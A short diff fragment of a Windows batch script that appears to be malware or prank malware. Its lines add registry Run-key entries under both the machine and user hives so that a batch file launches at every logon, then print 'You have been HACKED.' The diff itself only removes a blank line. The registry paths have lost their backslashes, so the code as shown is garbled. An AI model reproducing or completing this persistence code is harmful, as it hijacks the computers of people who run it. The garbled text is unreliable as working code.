@@ -11,5 +11,4 @@ reg add hkey_local_machinesoftwaremicrosoftwindowscurrentversionrun /v startAPI 
 reg add hkey_current_usersoftwaremicrosoftwindowscurrentversionrun /v /t reg_sz /d c:windowshartlell.bat /f
 
 echo You have been HACKED.
-
 PAUSE
